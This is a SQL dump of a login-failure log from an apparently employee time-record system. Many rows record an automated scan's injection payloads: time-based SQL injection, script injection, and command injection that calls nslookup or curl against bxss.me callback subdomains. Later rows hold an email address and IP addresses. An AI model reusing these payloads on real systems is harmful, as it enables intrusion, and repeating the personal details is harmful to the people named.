INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1429', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1430', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1431', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1432', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*jmuumt||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1433', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1434', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1435', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitqjnldmuceld044a.bxss.me||curl hitqjnldmuceld044a.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1436', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*tfelel||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1437', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >7hNq(9342)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1438', '', '2023-05-08 03:50:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1439', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitojqmsyeclx9e6c7.bxss.me&\'\\\"`0&nslookup -q=cname hitojqmsyeclx9e6c7.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1440', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >7hNq(9904)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1441', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1442', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitrmqyjqgthl94e56.bxss.me||curl hitrmqyjqgthl94e56.bxss.me)&\'\\\"`0&(nslookup -q=cname hitrm', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1443', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1444', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1445', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: RDFYjolf9432011', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1446', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1447', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hitgjsdfxgyoxf0c0e.bxss.me||curl hitgjsdfxgyoxf0c0e.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1448', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1449', '', '2023-05-08 03:50:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1450', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hitamnovtsbai3405d.bxss.me||curl hitamnovtsbai3405d.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1451', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1452', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1453', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hitawyisoxawo7ae50.bxss.me||curl hitawyisoxawo7ae50.bxss.me)|(nslookup -q=cname hitawyisoxa', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1454', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1455', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1456', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1457', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1458', '', '2023-05-08 03:50:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1459', '', '2023-05-08 03:50:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1460', '', '2023-05-08 03:50:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1461', '', '2023-05-08 03:50:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1462', '', '2023-05-08 03:50:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1463', '', '2023-05-08 03:50:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1464', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1465', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1466', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1467', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1468', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1469', '', '2023-05-08 03:50:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1470', '', '2023-05-08 03:50:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1471', '', '2023-05-08 03:50:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1472', '', '2023-05-08 03:50:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1473', '', '2023-05-08 03:50:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1474', '', '2023-05-08 03:50:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1475', '', '2023-05-08 03:50:35', '', 'Invalid username/password. Tried with: bzCp36yu', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1476', '', '2023-05-08 03:50:36', '', 'Invalid username/password. Tried with: -1 OR 2+348-348-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1477', '', '2023-05-08 03:50:36', '', 'Invalid username/password. Tried with: -1 OR 2+43-43-1=0+0+0+1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1478', '', '2023-05-08 03:50:36', '', 'Invalid username/password. Tried with: -1\' OR 2+71-71-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1479', '', '2023-05-08 03:50:37', '', 'Invalid username/password. Tried with: -1\' OR 2+469-469-1=0+0+0+1 or \'oKTkBqmN\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1480', '', '2023-05-08 03:50:37', '', 'Invalid username/password. Tried with: -1\" OR 2+15-15-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1481', '', '2023-05-08 03:50:38', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1482', '', '2023-05-08 03:50:39', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1483', '', '2023-05-08 03:50:40', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1484', '', '2023-05-08 03:50:41', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1485', '', '2023-05-08 03:50:42', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1486', '', '2023-05-08 03:50:43', '', 'Invalid username/password. Tried with: 0sdxzQxh\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1487', '', '2023-05-08 03:50:44', '', 'Invalid username/password. Tried with: rUy6DuDj\' OR 993=(SELECT 993 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1488', '', '2023-05-08 03:50:45', '', 'Invalid username/password. Tried with: gOaFtlJJ\') OR 589=(SELECT 589 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1489', '', '2023-05-08 03:50:46', '', 'Invalid username/password. Tried with: K8Wz9iLo\')) OR 12=(SELECT 12 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1490', '', '2023-05-08 03:50:47', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1491', '', '2023-05-08 03:50:47', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1492', '', '2023-05-08 03:50:47', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1493', '', '2023-05-08 03:50:48', '', 'Invalid username/password. Tried with: @@4VInb', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1494', '', '2023-05-08 03:50:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1495', '', '2023-05-08 03:50:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1496', '', '2023-05-08 03:50:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1497', '', '2023-05-08 03:50:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1498', '', '2023-05-08 03:50:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1499', '', '2023-05-08 03:50:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1500', '', '2023-05-08 03:50:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1501', '', '2023-05-08 03:50:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1502', '', '2023-05-08 03:50:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1503', '', '2023-05-08 03:50:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1504', '', '2023-05-08 03:50:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1505', '', '2023-05-08 03:50:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1506', '', '2023-05-08 03:50:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1507', '', '2023-05-08 03:51:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1508', '', '2023-05-08 03:51:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1509', '', '2023-05-08 03:51:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1510', '', '2023-05-08 03:51:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1511', '', '2023-05-08 03:51:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1512', '', '2023-05-08 03:51:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1513', '', '2023-05-08 03:51:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1514', '', '2023-05-08 03:51:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1515', '', '2023-05-08 03:55:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1516', '', '2023-05-08 04:04:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1517', '', '2023-05-08 04:07:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1518', '', '2023-05-08 04:14:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1519', '', '2023-05-08 04:17:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1520', '', '2023-05-08 06:15:55', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1521', '', '2023-05-08 06:16:06', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1522', '', '2023-05-08 06:16:06', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1523', '', '2023-05-08 06:16:06', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1524', '', '2023-05-08 06:16:07', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1525', '', '2023-05-11 17:55:51', '', 'Invalid username/password. Tried with: jamesdagala@gmail.com', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1526', '', '2023-05-11 17:59:06', '', 'Invalid username/password. Tried with: admin', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1527', '', '2023-05-11 17:59:12', '', 'Invalid username/password. Tried with: admin', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1528', '', '2023-05-11 17:59:37', '', 'Invalid username/password. Tried with: admin', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1529', '', '2023-05-11 17:59:39', '', 'Invalid username/password. Tried with: admin', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1530', '', '2023-05-11 18:00:47', '', 'Invalid username/password. Tried with: hrmisv10', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1531', '', '2023-05-11 18:07:43', '', 'Invalid username/password. Tried with: hrmisv10', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1532', '', '2023-05-11 18:15:02', '', 'Invalid username/password. Tried with: hrmisv10', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1533', '', '2023-05-11 18:18:19', '', 'Invalid username/password. Tried with: ', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1534', '', '2023-05-11 18:18:22', '', 'Invalid username/password. Tried with: ', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1535', '', '2023-05-11 18:20:16', '', 'Invalid username/password. Tried with: hrmisdost', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1536', '', '2023-05-11 18:20:21', '', 'Invalid username/password. Tried with: hrmisdost', '14.162.146.239');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1537', '', '2023-07-04 20:59:56', '', 'Invalid username/password. Tried with: hyj', '41.155.53.40');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1538', '', '2023-07-17 08:37:49', '', 'Invalid username/password. Tried with: admin', '115.147.12.230');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1539', '', '2023-07-17 12:26:40', '', 'Invalid username/password. Tried with: admin', '115.147.12.230');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1540', '', '2023-08-03 12:06:26', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1541', '', '2023-08-03 12:06:36', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1542', '', '2023-08-03 12:07:37', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1543', '', '2023-08-03 12:07:54', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1544', '', '2023-08-03 12:32:03', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1545', '', '2023-08-03 12:41:33', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1546', '', '2023-08-08 12:03:44', '', 'Invalid username/password. Tried with: mlbg', '58.69.150.197');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1547', '', '2023-10-16 15:10:23', '', 'Invalid username/password. Tried with: Terso a balives', '175.176.85.123');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1548', '', '2023-11-03 16:18:28', '', 'Invalid username/password. Tried with: ncb1588', '27.110.158.211');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1549', '', '2023-11-03 16:18:53', '', 'Invalid username/password. Tried with: ncb1588', '27.110.158.211');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1550', '', '2023-11-06 10:20:11', '', 'Invalid username/password. Tried with: 189', '202.90.141.177');
